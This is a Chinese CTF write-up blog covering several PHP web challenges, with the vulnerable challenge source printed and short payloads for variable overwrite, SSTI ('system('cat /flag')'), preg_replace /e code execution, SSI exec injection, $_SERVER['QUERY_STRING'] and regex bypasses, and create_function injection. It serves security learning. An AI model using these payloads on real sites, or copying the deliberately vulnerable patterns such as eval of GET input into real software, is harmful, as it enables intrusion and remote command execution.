<h3 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h3><p>最近做的几个题都是这种类型，总是要我扫一下目录，扫出来有一个&#x2F;.git文件夹。想获取.git下的源码我们需要使用Githack这个工具，就能把源码扒下来了，一开始看到一个花里胡哨的cms，最下面还有一个发送邮件，我还以为是那种cms的神仙漏洞或者是xss盗号之类的神仙操作，结果.git拿到这么个和原文无关的代码，着实有点过分</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string">"dog"</span><span class="token punctuation">;</span>
<span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string">"cat"</span><span class="token punctuation">;</span>
<span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string">'yds'</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    $<span class="token variable">$x</span> <span class="token operator">=</span> $<span class="token variable">$y</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>



<span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>先理清楚这里的思路，$$x两个美元符号，代表一个以$x的值为变量名的变量。<br>$$x&#x3D;$y意为将POST方式传递过来的参数直接创建对应变量进行赋值<br>而$$x&#x3D;$$y则是将变量名为$x的变量的值变为变量名为$y的变量的值，要想完成变量覆盖，就得在这一层把flag的值给拿过来<br>第一层判断要求若是要GET传flag，必须是flag&#x3D;flag<br>第二层判断要求GET和POST至少有传一个flag<br>第三层判断要求不能出现flag&#x3D;flag</p>
<p>若要在最后的echo语句中获取flag，则至少得提交一个flag上去，而POST中提交flag必定使得flag的值被覆盖，get中提交flag则出现了第一层和第三层的矛盾，不去修改flag则会导致在第二层退出。即想要通过正统道路获得flag是不可能的(但是他那个echo $flag真的太诱人了，我在那看了好久)</p>
<p>正确的思路在于exit也能输出变量，我们只要把exit中退出的变量覆盖成flag然后创造退出的条件就可以了（总觉得这个题有点高中考试的味道，为了出题而出题？）</p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>很直接的一个题，就是我没想到，菜</p>
<p>题目flag.php界面显示了当前ip，测试之后发现可以使用xff头对显示ip进行控制，问题在于这是什么类型的攻击</p>
<p>百度得知基于xff头的攻击一般是注入或者xss，注入各种fuzz无果，xss不会，最后是师傅提示是模板注入，就直接出了，直接一步system(‘cat &#x2F;flag’)</p>
<h3 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h3><p>页面能够显示的内容，可选择的攻击方式有xss和ssti，xxe攻击一般得要有json格式的数据包发过去，并其中一项在页面中显示才有效</p>
<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>和上个IP这个题一样的界面，简单测试64之后发现仍存在SSTI，通过如图方法测试获知使用引擎为twig<br><img src="https://pic3.zhimg.com/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1200x500.jpg"><br>php下的一个模板，可以根据这篇文章对ssti及相关攻击方式有一个基础了解</p>
<p>一开始以为有过滤的，打了半天打不动，结果应该是需要用专业的payload打，为此专门去GitHub看了他们的源码，是在执行出现问题的时候返回了一句’what do you want to do’，而不是在查黑名单</p>
<p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
<h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>第一层很简单，用PHP伪协议就能过，第二步进入next.php，比较复杂的一个preg_replace的漏洞<br>上源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/('</span><span class="token punctuation">.</span><span class="token variable">$re</span><span class="token punctuation">.</span><span class="token string">')/ei'</span><span class="token punctuation">,</span> <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>一开始还担心这个函数定义的位置会不会影响调用，后来试了一下发现这个和python C++不一样，定义在后面的函数前面也可以调用</p>
<p>preg_replace中的e参数通常造成安全隐患，他会将替代的部分作为PHP代码执行并将执行结果作为真正的替换字符串，但是这里替换字符串被写死了，而另外两个参数可控，但是在正则匹配中，允许以\n(n为数字)的形式对匹配到的组进行访问，而这里\1即为对正则匹配到的第一个组进行访问，即($re)匹配的部分，故形如.*&#x3D;${phpinfo()}的payload就可以顺利执行</p>
<p>而PHP会把一些不合法字符通过下划线代替，比如这里的. 还有[ 等符号，所以需要一个新的通配符进行匹配，<code>\S</code>即为匹配除空白字符的一切字符，<code>\s</code>则为匹配所有空白字符。通过\S*即可实现任意字符的匹配。</p>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>命令执行的时候要用${phpinfo()}这种动态变量的形式才能执行，直接写phpinfo()的话结果就是phpinfo()这个字符串，使用${phpinfo()}这么写时，PHP会认为大括号里面的东西是个变量先执行，再以其返回值为名创建一个变量，这样子才能进行命令执行</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>又是一个藏比题，要审源码就直接审嘛，每次整个备份文件的问题来找源码，上次.git这次.swp备份源码泄露，还有一个在html里面藏了个base32，我一开始base64没解出来，佛了。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>
            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$text</span> <span class="token operator">=</span> '
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>
            
    <span class="token punctuation">}</span><span class="token keyword">else</span>
    <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
<span class="token delimiter">?></span>
</code></pre>
<p>给了部分源码，第一层一个简单的md5碰撞，用个随机生成字符串脚本跑一下就出了一个能用的<code>FaRmZGN2nK</code><br>第二层是可以把我们post的username写到一个后缀为.shtml的文件里面，是一个没有见过的其妙类型，前面那个生成hash的函数纯粹唬人，就是各种散列计算取得一个文件名罢了，毫无作用<br>查了一下.shtml这种文件类型，对应了Apache一个SSI的文件包含和命令执行漏洞，按照样例payload打过去就可以了<br><code>&lt;!--#exec cmd=ls&quot;--&gt;</code></p>
<p>SSI也需要用户输入内容可以显示在界面上，这种类型的漏洞目前有xss，ssti和ssi三种可能了，不过ssi只能在.shtml这种后缀的文件上使用，算是一个特色</p>
<h3 id="查到payload的链接"><a href="#查到payload的链接" class="headerlink" title="查到payload的链接"></a>查到payload的链接</h3><p><a href="https://www.cnblogs.com/endust/p/11826210.html">https://www.cnblogs.com/endust/p/11826210.html</a></p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>一个一系列的绕过和一个create_function注入，非预期里面还有字符串的取反异或操作，结果是不用eval也可以将~^这些识别为操作进行字符串处理么</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span>
    <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
<span class="token delimiter">?></span>
</code></pre>
<h3 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="^$正则匹配绕过"></a>^$正则匹配绕过</h3><p>这里可以看PHPmanual里正则修饰符中的一句描述</p>
<blockquote>
<p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而**”行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符**(除非设置了 D 修饰符)。</p>
</blockquote>
<p>实际上，当一个字符串的结尾是换行符时，$字符同时匹配字符串的最后一位和换行符，可以用如下脚本测试，D修饰符为ENDONLY，即只匹配结尾</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"aaa\n"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aaa$/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">echo</span> <span class="token string">"success1\n"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^aaa$\n/"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">echo</span> <span class="token string">"success2\n"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^aaa$/D"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">echo</span> <span class="token string">"success3\n"</span><span class="token punctuation">;</span>
</code></pre>
<p>输出结果为success1 success2</p>
<h3 id="SERVER-‘QUERY-STRING’-绕过"><a href="#SERVER-‘QUERY-STRING’-绕过" class="headerlink" title="$_SERVER[‘QUERY_STRING’]绕过"></a>$_SERVER[‘QUERY_STRING’]绕过</h3><p>平常我们都知道POST和GET传过去的参数会在后端进行url解码，我一直以为是PHP后端做的自动工作，但是实际上应该是POST和GET进行的解码，而$_SERVER[‘QUERY_STRING’]则是直接获取url问号后的全部内容，并且不会经过url解码，这样子就能完成绕过。</p>
<h3 id="REQUEST变量覆盖"><a href="#REQUEST变量覆盖" class="headerlink" title="$_REQUEST变量覆盖"></a>$_REQUEST变量覆盖</h3><p>$_REQUEST是一个包含GET，POST，COOKIE三个超全局变量的数组，php.ini中有一个REQUEST解析顺序，默认是GP，即先GET后POST，这样子GET和POST同时传递一个同名参数，POST的参数会覆盖GET的参数</p>
<p>这里有一个巨大坑，我一开始没有意识到REQUEST中包含COOKIE，然后把源码拉到本地来做了一遍又绕过去了，在这里想了好久不知道哪里错了，甚至怀疑是不是php.ini被改了，但是这样子就无解了，花了好久最后师傅告诉我REQUEST还包含COOKIE，然后COOKIE的值带了英文，导致过不了检测<br><a href="https://www.ucloud.cn/yun/30265.html">https://www.ucloud.cn/yun/30265.html</a></p>
<h3 id="sha1绕过"><a href="#sha1绕过" class="headerlink" title="sha1绕过"></a>sha1绕过</h3><p>一开始还以为是要sha1强碰撞，因为已经有了md5的强碰撞结果，搜出来一个sha1也说不定呢，结果是用PHP的sha函数不能处理数组返回false的方法绕过</p>
<h3 id="数组绕过正则"><a href="#数组绕过正则" class="headerlink" title="数组绕过正则"></a>数组绕过正则</h3><p>这里我们在sha1绕过时新增了两个数组变量shana[]和passwd[]，但是这两个不需要在POST处在提交一个进行变量覆盖，因为正则表达式没法去匹配数组</p>
<h3 id="create-function命令注入"><a href="#create-function命令注入" class="headerlink" title="create_function命令注入"></a>create_function命令注入</h3><p>这里才是这个题的核心考点，create_function这个函数可以说是非常的危险了，底层的实现非常玄幻，导致我们闭合括号之后居然可以进行任意命令执行<br>create_function接受两个参数，第一个为参数列表，第二个为函数执行的代码<br>例如<code>a=create_function(&#39;$a,$b&#39;, &#39;return($a+$b);&#39;);</code><br>就创建了一个如下函数</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
